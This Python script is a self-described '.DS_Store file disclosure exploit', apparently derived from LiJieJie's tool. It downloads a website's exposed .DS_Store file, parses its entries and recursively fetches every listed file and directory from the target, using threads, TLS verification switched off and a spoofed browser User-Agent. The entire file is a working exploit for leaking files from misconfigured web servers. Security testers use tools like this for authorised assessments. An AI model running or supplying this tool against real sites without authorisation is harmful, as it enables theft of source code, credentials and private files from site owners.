#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# LiJieJie    my[at]lijiejie.com    http://www.lijiejie.com

import click
import logging
import sys
try:
    from urllib.parse import urlparse
except Exception as e:
    from urlparse import urlparse
import os
import queue
import threading
from io import BytesIO
from ds_store import DSStore
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Scanner(object):
    def __init__(self, start_url):
        self.queue = queue.Queue()
        self.queue.put(start_url)
        self.processed_url = set()
        self.lock = threading.Lock()
        self.working_thread = 0
        self.dest_dir = os.path.abspath('.')

    def is_valid_name(self, entry_name):
        if entry_name.find('..') >= 0 or \
                entry_name.startswith('/') or \
                entry_name.startswith('\\') or \
                not os.path.abspath(entry_name).startswith(self.dest_dir):
            try:
                print('[ERROR] Invalid entry name: %s' % entry_name)
            except Exception as e:
                pass
            return False
        return True

    def process(self):
        while True:
            try:
                url = self.queue.get(timeout=2.0)
                self.lock.acquire()
                self.working_thread += 1
                self.lock.release()
            except Exception as e:
                if self.working_thread == 0:
                    break
                else:
                    continue
            try:
                if url in self.processed_url:
                    continue
                else:
                    self.processed_url.add(url)
                base_url = url.rstrip('.DS_Store')
                if not url.lower().startswith('http'):
                    url = 'http://%s' % url
                schema, netloc, path, _, _, _ = urlparse(url, 'http')
                try:
                    response = requests.get(
                        url, 
                        allow_redirects=False, 
                        verify=False, 
                        headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                            }
                        )
                except Exception as e:
                    self.lock.acquire()
                    print('[ERROR] %s' % str(e))
                    self.lock.release()
                    continue

                # checks if link is correct
                if response.status_code == 200:
                    folder_name = netloc.replace(':', '_') + '/'.join(path.split('/')[:-1])

                    if not os.path.exists(folder_name):
                        os.makedirs(folder_name)

                    # for threads synchronization
                    with open(netloc.replace(':', '_') + path, 'wb') as outFile:
                        self.lock.acquire()
                        print('[%s] %s' % (response.status_code, url))
                        self.lock.release()
                        outFile.write(response.content)

                    if url.endswith('.DS_Store'):
                        ds_store_file = BytesIO()
                        ds_store_file.write(response.content)

                        dirs_files = parse_dstore_data(ds_store_file)
                        directories = dirs_files['directories']
                        files = dirs_files['files']

                        for file in files:
                            if file != '.':
                                self.queue.put(base_url + file)

                        for directory in directories:
                            self.queue.put(base_url + directory + '/.DS_Store')

            except Exception as e:
                self.lock.acquire()
                print('[ERROR] %s' % str(e))
                self.lock.release()
            finally:
                self.working_thread -= 1

    def scan(self, threads):
        all_threads = []
        for i in range(threads):
            t = threading.Thread(target=self.process)
            all_threads.append(t)
            t.start()

# https://bitbucket.org/grimhacker/ds_store_parser/src/master/ds_store_parser.py
def parse_dstore_data(filename):
    entries = {
        "directories": set(),
        "files": set()
    }
    files = set()
    with DSStore.open(filename,"r+") as d:
        for f in d:
            try:
                filename = f.filename
                logging.debug("name: '{}' code: '{}' type: '{}' value: '{}'".format(f.filename, f.code, f.type, f.value))
                if f.code in [b"BKGD", b"ICVO", b"fwi0", b"fwsw", b"fwvh", b"icsp", b"icvo", b"icvt", b"logS", b"lg1S", b"lssp", b"lsvo", b"lsvt", b"modD", b"moDD", b"phyS", b"ph1S", b"pict", b"vstl", b"LSVO", b"ICVO", b"dscl", b"icgo", b"vSrn"]:
                    logging.debug("Entry '{}' has code '{}' so assume directory.".format(filename, f.code))
                    entries["directories"].add(filename)
                else:
                    logging.debug("Entry '{}' has code '{}' so assume not directory.".format(filename, f.code))
                    files.add(filename)
            except Exception as e:
                logging.warning("Error parsing item: {}".format(e))
    logging.debug("Checking suspected files aren't in the directory list...")
    for file_ in files:
        if file_ not in entries["directories"]:
            entries["files"].add(file_)
    return entries


@click.command()
@click.argument('url')
@click.option("-t", "--threads", default=5, type=int, help="How fast did you want to download all the files. (default: 5)")
@click.help_option(help='A .DS_Store file disclosure exploit. It parses .DS_Store and downloads files recursively.')
def main(url, threads):
    """A .DS_Store file disclosure exploit.
    
    It parses .DS_Store and downloads files recursively.
    """
    s = Scanner(url)
    s.scan(threads=threads)


if __name__ == '__main__':
    main()
